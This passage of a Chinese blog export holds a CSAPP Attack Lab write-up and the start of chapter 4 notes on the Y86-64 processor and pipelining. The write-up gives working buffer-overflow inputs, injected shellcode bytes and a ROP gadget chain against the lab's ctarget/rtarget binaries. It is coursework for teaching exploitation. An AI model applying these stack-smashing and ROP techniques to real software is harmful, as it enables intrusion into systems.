函数\n\n大概的思路就是我们想办法把 getbuf 函数栈顶上方的返回值地址给篡改一下\n\n首先 `objdump -d ctarget > disa.asm` 对 `ctarget` 来个反编译。touch1 函数在 `00000000004017c0` 地址处，getbuf 函数的反编译：\n\n```assembly\n00000000004017a8 <getbuf>:\n  4017a8:\t48 83 ec 28          \tsub    $0x28,%rsp\n  4017ac:\t48 89 e7             \tmov    %rsp,%rdi\n  4017af:\te8 8c 02 00 00       \tcall   401a40 <Gets>\n  4017b4:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017b9:\t48 83 c4 28          \tadd    $0x28,%rsp\n  4017bd:\tc3                   \tret\n  4017be:\t90                   \tnop\n  4017bf:\t90                   \tnop\n```\n\ngetbuf 函数开了个缓冲区之后就去调用 Gets 函数了。缓冲区大小为 40 字节。缓冲区前面 8 字节应该就是返回值地址。那么我们可以大概构造出：\n\n```text\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nc0 17 40 00 00 00 00 00\n0a\n```\n\n前面 40 字节无所谓，用来填充缓冲区，后面 8 字节构造了到 touch1 函数的地址，最后给个 0a 作为换行符结束输入\n\n### Phase 2\n\n这次我们需要让 getbuf 函数不仅跳转到 touch2 函数，还携带一个参数\n\n我们可能要考虑，先篡改 getbuf 栈顶上面的返回值地址，让其先指向我们自己的代码，然后我们去修改 `%rdi`，然后再跳到 touch2 函数\n\n一个困难之处在于可能栈地址是随机的，好在经过测试，`ctarget` 栈地址并没有随机。我们使用 gdb 在 getbuf 出打断点，并输出 `%rsp` 的值，为 `0x5561dca0`。一个注意地方是我们需要在 gdb 中先 `set args -q` 使得程序不连接评分服务器\n\n任务指导书中特别提示，我们最好不要使用 `jmp` 和 `call` 来进行跳转，因为这两个指令的编码可能会比较困难，建议我们使用 `ret` 指令，那我们可能需要考虑继续篡改 getbuf 栈顶再上面 8 个字节的地方（因为第一次从 getbuf 跳转后 `%rsp` 向上移动了 8 个字节）\n\ntouch2 的地址为 `00000000004017ec`\n\n将指令变为二进制可以直接使用 gcc，如 `gcc -c example.s` 然后再 `objdump -d example.o > example.d`\n\n先构造自己的代码：\n\n```assembly\n    movq $0x59b997fa, %rdi\n    ret\n```\n\n编译得到的二进制为\n\n```text\n48 c7 c7 fa 97 b9 59 c3\n```\n\n然后我们考虑把这块代码放到缓冲区的位置，构造：\n\n```\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 c7 c7 fa 97 b9 59 c3\n98 dc 61 55 00 00 00 00\nec 17 40 00 00 00 00 00\n0a\n```\n\n注意缓冲区最后的地址是 `0x5561dca0`，但是我们不能直接从这个地址开始执行，应该从 `0x5561dc98` 开始：\n\n```\n(gdb) x/20xb 0x5561dc98\n0x5561dc98:     0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0xc3\n0x5561dca0:     0xa0    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n0x5561dca8:     0xec    0x17    0x40    0x00\n```\n\n提交后出现了段错误：\n\n```\nCookie: 0x59b997fa\nType string:Touch2!: You called touch2(0x59b997fa)\nValid solution for level 2 with target ctarget\nOuch!: You caused a segmentation fault!\nBetter luck next time\nFAIL: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:FAIL:0xffffffff:ctarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 C7 C7 FA 97 B9 59 C3 98 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00\n```\n\n根据 gdb，发现 touch2 判断通过之后还需要执行一个 validate 函数，这个函数调用 notify_server 函数，执行这个函数时发生了段错误，可能是我们注入的 touch2 地址破坏了什么东西\n\n看样子我们不能溢出太多，不然会造成莫名其妙的破坏，于是我考虑另一个方案，跳到我注入的代码之后，我先把 `%rsp` 减少 8，然后再把 touch 地址写到 `(%rsp)` 处，这样就确保对栈破坏最小\n\n```assembly\n    movq $0x59b997fa, %rdi\n    add $-8, %rsp\n    movq $0x004017ec, (%rsp)\n    ret\n```\n\n得到二进制：\n\n```\n\nans2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\t48 c7 c7 fa 97 b9 59 \tmov    $0x59b997fa,%rdi\n   7:\t48 83 c4 f8          \tadd    $0xfffffffffffffff8,%rsp\n   b:\t48 c7 04 24 ec 17 40 \tmovq   $0x4017ec,(%rsp)\n  12:\t00\n  13:\tc3                   \tret\n\n```\n\n构造\n\n```\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 c7 c7 fa 97 b9 59 48 83 c4 f8 48 c7 04 24 ec 17 40 00 c3\n8c dc 61 55\n0a\n```\n\n终于通过\n\n不过后续在做 Phase 3 的时候实在好奇为什么不能再往上多修改一些栈数据，不能多修改的话可能会影响 Phase 3 的发挥。\n\n在 gdb 中，触发段错误后，使用 disas 看到了触发段错误的指令：`movaps %xmm0,-0x40(%rbp)` 查看 `%rbp` 的值是正常的，应该不是引用了非法内存，这就很奇怪了，于是询问 ai 得知，`movaps` 这个涉及到 `%xmm0`（涉及到的原因应该不是浮点运算，应该是使用 `%xmm0` 做向量运算），这个指令要求目的地址按 16 字节对齐，一般情况下编译器会自动保证这里是满足对齐要求的，但是我们之前修改了 `%rsp` ，可能破坏了对齐\n\n### Phase 3\n\n这次要求我们让程序跳转到 touch3，要求我们不仅注入代码还要注入特定字符串，并传递字符串指针作为 touch3 的参数\n\ncookie 对应的 ascii 码的十六进制表示为 `0x6166373939623935`，然后再加一个 `00` 结尾。首先一个问题是这个字符串数据放在哪里。一开始怕破坏太多栈空间导致段错误（后来才知道是对齐的原因），所以考虑把数据放在栈中比较靠近底部的位置，然后在自己注入的代码中去注入数据：\n\n```assembly\n    movq $0x6166373939623935, %r8\n    movq %r8, 0x55620000\n    movq $0x00, 0x55620008\n    movq $0x55620000, %rdi\n    add $-8, %rsp\n    movq $0x004018fa, (%rsp)\n    ret\n```\n\n不过遗憾的是这样编译出来的代码太大，超过了 40 字节，导致后面无法再篡改返回值地址了\n\n观察 x86-64 指令的编码，如果直接指定内存的地址，那么会直接占用 8 字节，而如果是根据寄存器 + 偏移进行寻址的话编码大小会少一些\n\n目前比较好控制的寄存器就是 `%rsp` 了，当跳到我们注入的代码之后，此时 `%rsp` 指向 test 函数的栈顶，我们考虑把数据直接注入到 `%rsp` 上\n\n```assembly\n    movq $0x6166373939623935, %r8\n    movq %r8, (%rsp)\n    movq $0x00, 8(%rsp)\n    movq %rsp, %rdi\n    add $-8, %rsp\n    movq $0x004018fa, (%rsp)\n    ret\n```\n\n构造：\n\n```\n00 49 b8 35 39 62 39 39 37 66 61 4c 89 04 24 48 c7 44 24 08 00 00 00 00 48 89 e7 48 83 c4 f8 48 c7 04 24 fa 18 40 00 c3\n79 dc 61 55\n0a\n```\n\n通过\n\n### Phase 4\n\n从这个 phase 开始，我们需要一个新的被称为 ROP 的攻击手段。任务指导书中介绍了这个手段。\n\n大概就是，如果程序的栈地址是随机化的，且栈所处的内存被记为不可执行，那么前面的代码注入的方法就行不通了，甚至使用 nop sled 都无法发挥作用。ROP 考虑利用现有的代码，汇编指令都是一个一个放置的，只有我们找对了第一个指令的起始地址，那么后续指令就会一个一个跟着执行，但是如果我们截取现有代码中的一部分指令，比如从一个完整的指令中间开始解码指令，有可能就能得到我们想执行的恶意代码。一般我们需要反编译程序然后找到这种指令的首地址。我们可能更倾向于找最后是 `0xc3` 结尾的部分，因为 `0x3c` 在 x86-64 中是 `ret` 指令，这样的话我们可以在执行一部分恶意代码之后跳到下一个地方执行恶意代码。\n\n![](http://pic.caiwen.work/i/2025/07/21/687e2ad501bd7.png)\n\n本次 lab 为了简单起见，要攻击的程序 `rtarget` 里面有很多奇怪函数，目的是暴露潜在的恶意指令，方便我们攻击。并且任务指导书中划定了寻找可以利用的指令的范围。\n\nPhase 4 需要我们像 Phase 2 那样进行攻击，大概就是我们需要寻找可以利用的指令，这些指令可以调用 touch2 并传递一个参数\n\n要注入数据的话，直接从现有指定中找应该是几乎不可能的。不过指导书里有一个提示，我们可以考虑利用 `pop` 指令，这个可以把当前栈顶数据弹到寄存器，而栈顶的元素我们是可以自己去设置的\n\n那么我们现在要寻找的目标是一个 `pop %rdi` 或者是 `pop` 后再 `mov` 到 `%rdi`\n\n指令对应的字节如下：\n\n![](http://pic.caiwen.work/i/2025/07/21/687e2e6979daf.png)\n\n首先是这里\n\n```text\n00000000004019a7 <addval_219>:\n  4019a7:\t8d 87 51 73 58 90    \tlea    -0x6fa78caf(%rdi),%eax\n  4019ad:\tc3                   \tret\n```\n\n`58` 是 `popq %rax`，可以让我们的数据传到 `%rax` 中，后续的 `90` 是 `nop`，而\n\n```\n00000000004019a0 <addval_273>:\n  4019a0:\t8d 87 48 89 c7 c3    \tlea    -0x3c3876b8(%rdi),%eax\n  4019a6:\tc3                   \tret\n```\n\n中的 `48 89 c7` 则可以直接让我们把注入的数据传到参数中，后面的 `c3` 直接返回\n\n两者的地址分别是 `0x4019ab` 和 `0x4019a2`，touch2 的地址为 `0x4017ec`\n\n于是我们这么构造：\n\n```text\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nab 19 40 00 00 00 00 00\nfa 97 b9 59 00 00 00 00\na2 19 40 00 00 00 00 00\nec 17 40 00 00 00 00 00\na0\n```\n\n显示填充缓冲区，然后是第一次跳转地址（到 `pop`），然后是注入数据，然后是第二次跳转地址（到 `mov`），然后是第三次跳转地址（到 touch2）\n\n### Phase 5\n\n指导书在这里开始有点劝退还挺有意思（）\n\n首先提到这里需要用到一些新的指令\n\n![](http://pic.caiwen.work/i/2025/07/21/687e2e971bbc0.png)\n\nD 组比较有意思，这些指令执行之后并不会改变任何寄存器，可以视为 `nop` 指令\n\n以及提到了标准答案用到了 8 个 gadgets，非常可怕\n\n同时还说到了 `movl` 会将寄存器的高 32 位清零\n\n首先我们要考虑还和上面一样注入字符串的数据。字符串指针的数据比较难搞，因为我们现在不知道栈的具体地址，不能直接把指针指向栈上。而给出的指令都没有涉及到内存寻址。\n\n我想到一个办法，可以考虑把数据正好注入在最后执行 touch3 之前的栈顶上，然后把 `%rsp` 赋值给 `%rdi`。不过对应的 `48 89 e7` 没有在代码中找到。反而是观察到了 `48 89 e0` 有很多，对应于 `mov %rsp,%rax`。我们过滤掉一些不能用的（即 `48 89 e0` 后面还跟着其他未知指令），还有这些：\n\n```\n0000000000401a03 <addval_190>:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tret\n0000000000401aab <setval_350>:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tret\n```\n\n那么再考虑从 `%rax` 传到别的地方，刚好就有下面这个 `mov %rax,%rdi`\n\n```\n00000000004019c3 <setval_426>:\n  4019c3:\tc7 07 48 89 c7 90    \tmovl   $0x90c78948,(%rdi)\n  4019c9:\tc3                   \tret\n```\n\n不过还有一点，我们把 `%rsp` 传给 `%rax` 时，`%rsp` 指向的内容是一个 8 字节的下一步要跳转的地址，我们是不可能在这个地方放置数据的\n\n一个想法是，我们希望 `mov %rsp,%rax` 之后再 `pop` 一下，让 `%rsp` 往下走一下\n\n要实现这个，我们可能需要 `89 e0` 到 `89 e7` 后面找 `58` 到 `5f`，可惜根本找不到。\n\n于是到这里就完全卡住了，我几乎把能用到的指令全找出来了。大概是：\n\n- 可以使用 `pop %rax` 将栈中数据转移到 `%rax`\n- 可以通过 `mov` 指令将 `%esp` 数据转移到 `%rax`\n\n然后数据从 `%rax` 有两个走向\n\n- `%rax` -> `%edi`\n- `%rax` -> `%edx` -> `%ecx` -> `%esi`\n\n不过现在还是难以获得注入字符串数据的指针。在这里卡了快一天了，最后直接让 ai 给了一点提示。ai 说注意使用 `lea` 指令。于是我突然意识到，我们不光可以从字节中直接截取出指令，还能直接利用现有的指令，比如这里就有个非常关键的地方：\n\n```\n00000000004019d6 <add_xy>:\n  4019d6:\t48 8d 04 37          \tlea    (%rdi,%rsi,1),%rax\n  4019da:\tc3                   \tret\n```\n\n这个可以让 `%rax` 变为 `%rdi + %rsi`，而 `%rdi` 和 `%rsi` 是可以根据我们上面分析出来的数据走向得到的\n\n先整理一下我们用到的指令的地址：\n\n```\npopq %rax: 0x4019cc\n00000000004019ca <getval_280>:\n  4019ca:\tb8 29 58 90 c3       \tmov    $0xc3905829,%eax\n  4019cf:\tc3                   \tret\nmovq %rsp,%rax: 0x401a06\n0000000000401a03 <addval_190>:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tret\nmovq %rax,%rdi: 0x4019a2\n00000000004019a0 <addval_273>:\n  4019a0:\t8d 87 48 89 c7 c3    \tlea    -0x3c3876b8(%rdi),%eax\n  4019a6:\tc3                   \tret\nmovl %eax,%edx: 0x4019dd\n00000000004019db <getval_481>:\n  4019db:\tb8 5c 89 c2 90       \tmov    $0x90c2895c,%eax\n  4019e0:\tc3                   \tret\nmovl %edx,%ecx: 0x401a34\n0000000000401a33 <getval_159>:\n  401a33:\tb8 89 d1 38 c9       \tmov    $0xc938d189,%eax\n  401a38:\tc3                   \tret\nmovl %ecx,%esi: 0x401a27\n0000000000401a25 <addval_187>:\n  401a25:\t8d 87 89 ce 38 c0    \tlea    -0x3fc73177(%rdi),%eax\n  401a2b:\tc3                   \tret\nlea (%rdi,%rsi,1),%rax: 0x4019d6\n00000000004019d6 <add_xy>:\n  4019d6:\t48 8d 04 37          \tlea    (%rdi,%rsi,1),%rax\n  4019da:\tc3                   \tret\n```\n\n于是大概的思路就是，我们先把 `%rsp` 移动到 `%rdi` 中，然后通过 `pop` 将一个地址偏移量的数据从栈中传到 `%rax`，然后到 `%esi`，然后使用 `lea` 计算出字符串的地址，再传到 `%rdi` 中。字符串数据应该放在所有跳转地址的最后面\n\n一开始我是把 `%rsp` 放到 `%esi` 中的，后来在 gdb 中调试发现 rtarget 的栈位于整个虚拟内存空间比较高的一部分，这意味着栈地址的高 32 位是有数据的。而上面的指令中只有 `%eax` 到 `%edx`，不能传 64 位的栈地址\n\n然后大概是\n\n```\npopq %rax\t\t\t\t0x4019ca\nmovl %eax,%edx\t\t\t0x4019dd\nmovl %edx,%ecx\t\t\t0x401a34\nmovl %ecx,%esi\t\t\t0x401a27\nmovq %rsp,%rax\t\t\t0x401a06\nmovq %rax,%rdi\t\t\t0x4019a2\nlea (%rdi,%rsi,1),%rax\t0x4019d6\nmovq %rax,%rdi\t\t\t0x4019a2\n```\n\n然后注意一下地址偏移数据的构造。`%rsp` 被存到 `%rax` 的时候，`%rsp` 指向的位置后面需要继续放 4 个跳转地址，总共 32 字节，十六进制为 0x20\n\n```\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\ncc 19 40 00 00 00 00 00\n20 00 00 00 00 00 00 00\ndd 19 40 00 00 00 00 00\n34 1a 40 00 00 00 00 00\n27 1a 40 00 00 00 00 00\n06 1a 40 00 00 00 00 00\na2 19 40 00 00 00 00 00\nd6 19 40 00 00 00 00 00\na2 19 40 00 00 00 00 00\nfa 18 40 00 00 00 00 00\n35 39 62 39 39 37 66 61 00\na0\n```\n\n","summary":"本文详细介绍了x86-64汇编的数据格式、寄存器、操作数、指令集、函数调用机制、数据结构及缓冲区溢出防护技术，并提供了命令行工具和实验示例。","key":["csapp","汇编","反编译","x86","bomb lab","attack lab"],"tags":[],"path":["os","csapp","CSAPP第三章 - 程序的机器级表示.md"],"background":"http://pic.caiwen.work/i/2025/07/28/68875d22603ff.png","recommend":true,"status":"published"},{"type":"Article","title":"CSAPP第四章 - 处理器体系架构","id":"csapp-4","createTime":"2025-07-19T08:32:00.000Z","updateTime":"2025-09-05T15:00:23.006Z","content":"\n\n\n\n\n## 准备\n\n### Y86-64\n\n本章首先介绍了一个简化的指令集：Y86-64\n\n![](http://pic.caiwen.work/i/2025/07/23/688069a7c877d.png)\n\n其中 `OPq` 、`jxx`、`cmovXX` 是三个大类，每个种类都共享第一个字节的高位，具体功能的不同取决于这个字节的低位。其中 `rrmovq` 视为 `cmovXX` 一类，可以看成是无条件数据传送\n\n![](http://pic.caiwen.work/i/2025/07/23/68806a4ae1372.png)\n\n上述的 `rA` 和 `rB` 表示寄存器编号。寄存器名称和编号的对应如下：\n\n![](http://pic.caiwen.work/i/2025/07/23/68806a959d346.png)\n\n其中无寄存器的表示可以在后面设计电路的时候带来便利\n\n同时还有状态码寄存器 `CF`，`SF` 和 `OF`\n\n还有 `PC` 寄存器表示下一条指令的地址。`Stat` 寄存器描述当前处理器的状态，取值如下：\n\n![](http://pic.caiwen.work/i/2025/07/23/68806bd4abda7.png)\n\n其他地方大多与 X86-64 相同\n\n### HCL\n\n这一章还自己搞了个硬件控制语言 HCL，用来描述电路的控制逻辑\n\n与或非是电路中基本的逻辑门，其电路表示和对应的 HCL 表述如下：\n\n![](http://pic.caiwen.work/i/2025/07/23/68806d5079ecc.png)\n\n其中 a 和 b 是一个 bit\n\n将逻辑门进行组合就得到组合电路。组合电路的构建有如下的要求：\n\n- 每个逻辑门的输入比如是主输入，或者另一个逻辑门的输出，或者是某个存储单元的输出\n- 两个或者多个逻辑门的输出不能连在一起，否则线上的信号会产生矛盾\n- 组合电路必须是无环的\n\n比如有：\n\n![](http://pic.caiwen.work/i/2025/07/23/68806e5c341f3.png)\n\n对应的 HCL 为 `bool eq = (a && b) || (!a && !b);`，可以检测是否位相等\n\n还有：\n\n![](http://pic.caiwen.work/i/2025/07/23/68806ea2c9291.png)\n\n对应的 HCL 为 `bool out= (s && a) || (!s && b);`，可以进行多路复用\n\n我们可以把单个的逻辑门组合成一个大的字级计算的组合电路\n\n![](http://pic.caiwen.work/i/2025/07/23/68806f15c92f9.png)\n\nHCL 中可以直接表示，`bool Eq = (A == B);`\n\n字级的多路复用：\n\n![](http://pic.caiwen.work/i/2025/07/23/68807079d8c9d.png)\n\nHCL 中可以直接类似下面这样写：\n\n```\nword Out = [\n\t!s1 && !s0: A;\n\t!s1: B;\n\t!s0: C;\n\t1: D;\n]\n```\n\n这个表达式是按顺序求值的，只选择第一个为 1 的情况。最后的 1 表示默认情况\n\n组合逻辑电路还可以进行一些运算，不过具体的原理这里被忽略了，我们只抽象出一种叫做 算数/逻辑单元（ALU）的东西，它可以进行如下的操作：\n\n![](http://pic.caiwen.work/i/2025/07/23/6880724693add.png)\n\nHCL 还支持集合关系语法：\n\n```\nbool s1 = code in { 2, 3 };\nbool s0 = code in { 1, 3 };\n```\n\n## 指令设计\n\n我们把每个指令的处理统一成 6 个阶段：\n\n- 取值：从内存中读取指令\n- 译码：将指令中涉及到的寄存器具体的值取出\n- 执行：进行运算相关操作，比如运算指令，或者是地址的计算，增加或减少栈指针。对于有关条件的指令，对条件码的判断也在这个阶段\n- 访存：读取或者是写入内存\n- 写回：将数据写入到寄存器中\n- 更新 PC\n\n然后各个指令的设计如下：\n\n![](http://pic.caiwen.work/i/2025/07/23/68807910123cb.png)\n\n![](http://pic.caiwen.work/i/2025/07/23/688090049cf5f.png)\n\n![](http://pic.caiwen.work/i/2025/07/23/688090aeb307e.png)\n\n![](http://pic.caiwen.work/i/2025/07/23/6880a1da13afa.png)\n\n![](http://pic.caiwen.work/i/2025/07/23/688093bc2e989.png)\n\n## SEQ\n\n一个最简单的处理器设计如下：\n\n![](http://pic.caiwen.work/i/2025/07/23/6880955359f74.png)\n\n其中虚线表示单个位，细线表示单个字节，粗线表示一个字\n\n下表是一些常量：\n\n![](http://pic.caiwen.work/i/2025/07/23/688096180341b.png)\n\n### 取指阶段\n\n![](http://pic.caiwen.work/i/2025/07/23/68809652daa41.png)\n\n取指阶段首先根据 PC 来读一条指令的第一个字节，并拆分成 `icode` 和 `ifun` 两部分。如果之前 PC 指向的内存地址错误的话，那么指令内存会发生 `imem_error` 信号，这个信号将设置 `icode` 为 `nop`（无操作）指令\n\n如果 `icode` 是个非法指令的话，那么就会产生 `instr_valid` 信号\n\n合法的话，`icode` 将会决定这个指令是否用到寄存器和具体的数字。如果用到寄存器的话，产生 `need_regids` 信号，传递到 `align` ，使其读取后面一个字节（如果不传给 `align` 的话，那么 `align` 产生的值 `rA` 和 `rB` 均为 `F`，即无寄存器）。只需要一个寄存器的指令在我们之前的设计中已经要求字节的低位编码为 `F` 了，所以直接读就可以\n\n但是 `icode` 还会产生 `need_valc` 信号。但是这个信号不会决定 `align` 是否继续再向后读八个字节。我认为 `align` 会一直读后面八个字节的，因为多读没关系，PC 增加器才决定下一条地址从哪里读取\n\n`need_valc` 和 `need_regids` 共同决定 PC 增加的值\n\n总之，取值阶段完成之后我们可以得到 `icode`、`ifun`、`rA`、`rB`、`valC` 还有下一个 PC 值 `valP`\n\n### 译码和写回阶段\n\n![](http://pic.caiwen.work/i/2025/07/23/68809a975034e.png)\n\n首先是根据 `icode` 和 `rA` 计算 `srcA` 以获得 `valA`。我们还要考虑 `icode` 的原因在于一些指令没有寄存器作为操作数，但是还是需要使用到寄存器的值，比如 `ret` 指令需要 `%rsp` 的值。`valB` 同理\n\n在写回阶段，我们也是根据 `icode` 和 `rA` 决定写回的寄存器 `dstM`。另一个 `dstE` 同理。`valE` 和 `valM` 需要通过别的阶段来获得。但值得注意的是 `Cnd` 信号也会影响到 `dstE` 的选取，`Cnd` 是后续执行阶段，根据条件码和 `ifun` 计算出来的信号，在这里用来实现条件传送\n\n译码阶段结束，我们就可以得到 `valA` 和 `valB` 了。同时我们也知道稍后在写回阶段要写入的目标 `dstM` 和 `dstE`\n\n### 执行阶段\n\n![](http://pic.caiwen.work/i/2025/07/23/68809df2c940c.png)\n\n首先要根据 `icode` 判断 `aluA`\n\n- 取 `valA` （`OPq`、`rrmovq`、`cmovXX`）\n- 取 `valC`（`mrmovq` 和 `rmmovq` 计算地址，`irmovq`）\n- 取 `-8`、`+8`（`call` 、 `ret` 、`popq` 、`pushq` 有栈操作）\n\n根据 `icode` 判断 `aluB`\n\n- 取 `valB`\n- 取 `0`（`irmovq` 象征性的加上 `0` 以使得 `valE` 和 `valC` 相等，统一设计。或是 `rrmovq` 和 `cmovXX` 使得 `valE` 和译码得到的 `valA` 相等）\n\n同时根据 `icode` 和 `ifun` 计算 `alu_fun`，表示要执行的操作\n\n还会根据 `icode` 计算 `setCC` 表示是否要更新条件码。状态码将会根据 `setCC` 和计算得到的 `valE` 设置。新的条件码将在下一个时钟周期更新\n\n然后我们还会计算 `cnd`，这个值综合 `ifun` 和条件码，决定是否进行条件传送和条件跳转。综合 `ifun` 的原因是我们会有 `rrmovq` 这样的无条件传送和 `jmp` 这样的直接跳转\n\n经过这一阶段后，我们可以获得运算后的结果 `valE`\n\n### 访存阶段\n\n![](http://pic.caiwen.work/i/2025/07/23/6880a7646cc58.png)\n\n首先可以根据 `icode` 来决定是读还是写内存\n\n然后根据 `icode` 选择内存地址：\n\n- 取 `valE`（`pushq` 和 `call` ，`valE` 为开栈后栈顶的地址。`rmmovq` 和 `mrmovq` 为计算得到的目标内存地址）\n- 取 `valA`（`popq` 和 `ret` 用到的 `%rsp` 的值）\n\n如果要写数据的话，选择写入的内容\n\n- 取 `valA` （`pushq` 和 `rmmovq` 用到的寄存器）\n- 取 `valP`（`call` 把下一条指令的地址压入）\n\n经过这个阶段，如果我们是读内存的话，就得到了 `valM` 的值\n\n此外，我们还将综合之前产生的异常信号 `imem_err` 、`instr_valid` 和 `dmem_err` 和 `icode` 设置处理器状态。综合 `icode` 是由于要实现 `hlt` 指令\n\n### 更新 PC 阶段\n\n![](http://pic.caiwen.work/i/2025/07/23/6880aca57fd53.png)\n\n用 HCL 描述：\n\n```\nword new_pc = [\n    # Call. Use instruction constant\n    icode == ICALL : valC;\n    # Taken branch. Use instruction constant\n    icode == IJXX && Cnd: valC;\n    # Completion of RET instruction. Use value from stack\n    icode == IRET : valM;\n    # Default: Use incremented PC\n    1 : valP;\n];\n```\n\n根据 `icode` 值选用不同的值更新 PC\n\n- 对于 `call` 指令，直接取 `valC` 更新\n- 对于 `IJXX` 指令，如果可以进行跳转的话，也取 `valC`\n- 对于 `IRET` 指令，选取 `valM` 更新\n- 对于其他情况，选取 `valP` 更新\n\n## Pipeline\n\n### 流水线效率\n\n信号通过组合逻辑电路需要消耗一定的时间。我们假设上述 SEQ 的组合逻辑电路完成计算好耗时 300ps，同时寄存器的加载需要 20ps 的时间，那么总的延迟就是 320ps。我们定义吞吐量为每条指令发射间隔时间的倒数，即\n\n$$\n\\text{吞吐量} = \\frac{\\text{1 条指令}}{(300+20)ps}\\cdot \\frac{1000ps}{1ns}\\approx 3.12GIPS\n$$\n\n其中延时意味着一条指令从发射到完全指令的耗时，吞吐量为每秒可以处理掉多少的指令。\n\n我们考虑一种优化，即我们把一个大的组合逻辑分成若干个小的组合逻辑，同时在中间加上寄存器。一个阶段执行完毕之后，就把计算出来的中间结果放入到寄存器中。在下一个时钟上升沿，上一阶段的结果作为下一段的输入数据，继续进行下一阶段的计算，而由于中间插入的寄存器可以把数据隔离开，上一阶段的电路可以继续处理下一条指令。这样就形成了一个类似流水线的东西，电路可以同时计算不同指令的不同部分，不存在电路是空闲的：\n\n![](http://pic.caiwen.work/i/2025/07/27/68857ccf49dab.png)\n\n延迟稍有提高，但是\n\n$$\n\\text{吞吐量} = \\frac{\\text{1 条指令}}{(100+20)ps}\\cdot \\frac{1000ps}{1ns}\\approx 8.33GIPS\n$$\n\n提高了不少\n\n不过像这样改进流水线还需要一些注意点。\n\n首先指令发射间隔时间需要取决于流水线中耗时最长的一部分，不能太短，不然会存在有的电路还没完成计算，就遇到下一个时钟上升沿，此时寄存器的数据就是错的。\n\n也因为如此，我们希望流水线的划分应当使得各个部分的耗时尽可能一致。比如同样是分成三阶段，下面的这个划分延迟更高，吞吐量更低：\n\n![](http://pic.caiwen.work/i/2025/07/27/68857e1013231.png)\n\n其次，流水线也不建议划分过多阶段，使得流水线过深。尽管阶段越多吞吐量越高，但是吞吐量的增加随着划分阶段数的增加是一个先快后慢的关系，到后期会存在划分阶段很多，硬件成本很高，但是吞吐量提升不大的局面。\n\n### 流水线概览\n\n直接在原有的 SEQ 上简单给各个阶段之间插入寄存器的话会出很多问题。\n\n其中一个问题是，根据流水线涉及，前一个指令取指阶段执行完毕进入译码阶段后，后一个指令立刻进入流水线进程取指。而取指阶段需要的 PC 需要等待上一条指令走到最后的更新 PC 阶段才可以得到。我们先不考虑原先的更新 PC 阶段，并把写回阶段拿出来作为流水线的最后阶段，于是我们流水线的阶段划分大致为：取值（F），译码（D），执行（E），访存（M），写回（W）五个阶段。在五个阶段之间插入寄存器，最终的结果大概如下：\n\n![](http://pic.caiwen.work/i/2025/07/27/688585d725d4e.png)\n\n其中 F 阶段开始前插入的寄存器称为 F 寄存器，D 阶段之前插入的寄存器为 D 寄存器，以此类推，插入的这些寄存器称为流水线寄存器。然后为了方便，我们用大写字母开头表示某个流水线寄存器的值，用小写字母开头表示某个阶段的运算结果。比如 M_stat 是流水线寄存器 M 上的某个值，而 m_stat 表示 M 阶段中经过 stat 运算单元得到的信号。\n\n在新的流水线架构中，在 D 阶段，我们通过 `icode` 和 `rA` 、`rB` 得到 `dstE` 和 `dstM` 之后，并不是直接将该信号传给寄存器中，毕竟还没过 E 和 M 阶段拿到要写入的数据。我们在后面的阶段中也传递 `dstE` 和 `dstM`，其中 E 阶段直接计算出条件码之后，通过 D 阶段传递过来的 `dstE` 计算新的 `dstE`（是否进行分支传送）继续传到后续的 M 和 W 阶段。其中寄存器写入目标的信号来自于 W 阶段的 `dstE` 和 `dstM`。图中省略了相关线路。\n\n另一个小改动是，我们在 D 阶段通过 Select 单元将 valP 和 valA 合并成 valA。这样合并的依据是，只有 `call` 指令和跳转指令会用到 valP，而这两个指令同时又不使用 valA。\n\n### 冒险\n\n#### 控制冒险\n\n上面我们提到上一条指令刚过了 F 阶段进入 D 阶段后，下一条指令紧接着又需要取指了，所以上一条指令在 F 阶段也必须把下一条指令的 PC 算出来。对于一般的指令，我们都可以直接通过当前 PC 加上根据 `icode` 和 `ifun` 计算出来的当前指令长度，得到下一个 PC。但是有一些例外。`call` 和 `jmp` 指令，我们需要取 `valC` 为下一个 PC。\n\n对于 `jXX` （条件跳转）指令，我们就有点棘手，因为是否跳转取决于状态码，而状态码需要在 E 阶段才能被计算。我们这里需要进行分支预测。这里用到的分支预测是 AT （Always Taken）策略，有研究表明这种策略预测成功概率为 60%。相反，NT（Never Taken）策略成功概率为 40%。书中还提到有更复杂的预测策略，有一个名为反向选择正向不选择（BTFNT）的策略，如果要跳转的地址比不跳转时下一条地址低的话就预测进行分支跳转，反之不跳转，这种策略的预测成功概率有 65%。\n\n对于 `ret` 指令，由于指令随后跳转到的地址是根据 `%rsp` 的值在内存中进行获取，而前面的一些指令还没完成访存和写回阶段，无法直接获取，且根本不可能预测返回指令在哪里。因此，我们暂且先不处理这一点。不过我们考虑其实返回地址并非不可预测，因为 `call` 和 `ret` 指令应该是成对出现的，`ret` 指令大多时候都会跳转到其对应的 `call` 指令位置（除了我们上一章缓冲区溢出的情况）。因此，一些高性能处理器运用了这个性质，其在取值单元放入一个硬件栈，`call` 时将地址压入栈中，`ret` 时将地址从栈中取回，这样来进行预测。\n\n#### 